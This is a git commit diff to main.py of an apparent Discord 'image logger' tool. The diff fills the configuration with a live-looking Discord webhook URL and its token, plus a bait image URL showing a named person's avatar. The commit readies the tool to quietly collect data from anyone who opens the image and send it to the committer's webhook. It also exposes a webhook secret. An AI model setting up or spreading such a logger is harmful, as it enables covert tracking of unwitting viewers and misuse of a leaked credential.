7475eb2cf937b35e95d19636e52444f4898c26a0
DeployedARCH <irlodem27@gmail.com>
2025-07-01 22:05:12 +0200

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1389698012984377395/m3qRwvrwfcq6T84aH4yK3RS9CyaFrAqVbNbTnaoWJcBOv1f_RJ124FSwxAMICAmQt9AP",
+    "image": "https://cdn.allfamous.org/people/avatars/flamefrags-886o-allfamous.org.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
